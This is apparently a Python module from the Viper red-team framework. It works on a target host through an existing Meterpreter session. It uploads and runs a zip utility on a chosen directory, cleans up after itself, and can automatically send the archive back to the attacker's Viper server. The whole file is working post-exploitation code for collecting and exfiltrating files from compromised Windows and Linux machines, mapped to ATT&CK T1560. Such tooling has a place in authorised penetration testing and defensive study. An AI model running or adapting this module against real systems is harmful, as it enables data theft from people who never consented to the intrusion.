# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "打包压缩目录并回传"
    DESC_ZH = "zip压缩目标指定目录,并将压缩后的文件回传到Viper."

    NAME_EN = "Zip directory and send back"
    DESC_EN = "Zip compresses the target specified directory, and send the compressed file to Viper."

    MODULETYPE = TAG2TYPE.Collection
    PLATFORM = ["Windows", "Linux"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM", "Root"]  # 所需权限
    ATTCK = ["T1560"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1560/003/"]
    README = ["https://www.yuque.com/vipersec/module/nf83mz"]
    AUTHOR = ["Viper"]
    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionStr(name='INPUTDIR', tag_zh="压缩目录", desc_zh="需要压缩的目录",
                  tag_en="Directory", desc_en="Fill in the directory that needs to be compressed", length=24),
        OptionInt(name='TIMEOUT',
                  tag_zh="超时时间", desc_zh="压缩命令超时时间",
                  tag_en="Time out", desc_en="Compression timeout",
                  default=60 * 10),
        OptionBool(name='GETRESULT', tag_zh="自动回传压缩文件", desc_zh="执行完成压缩后是否自动将文件回传到Viper",
                   tag_en="Automatically upload compressed files",
                   desc_en="Whether to automatically upload the file to Viper after the compression is performed",
                   default=False),
    ])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "multi/manage/upload_and_exec_api"
        self.outfile = None

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)

        if session.is_windows:
            self.set_msf_option("LPATH", "viperzip.exe")
            self.set_msf_option("RPATH", "viperzip_viper.exe")
        elif session.is_linux:
            self.set_msf_option("LPATH", "viperzip")
            self.set_msf_option("RPATH", "viperzip_viper")
        else:
            return False, "模块只支持Windows及Linux原生Session", "This module only supports Meterpreter for Windows and Linux"

        inputdir = self.param("INPUTDIR")
        self.outfile = f"{self.random_str(8)}.zip"
        args = f"-inputdir {inputdir} -outfile {self.outfile}"
        self.set_msf_option("ARGS", args)

        self.set_msf_option("CLEANUP", True)
        self.set_msf_option("TIMEOUT", self.param("TIMEOUT"))

        if self.param("GETRESULT"):
            self.set_msf_option("RESULTFILE", self.outfile)

        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return
        self.log_info("模块执行完成", "Module operation completed")
        self.log_good("压缩文件:", "Zip file")
        self.log_raw(data)
        if self.param("GETRESULT"):
            self.log_good(f"压缩后文件存放在<文件管理>:{message}", f"Zip file is stored in <Files>: {message}")
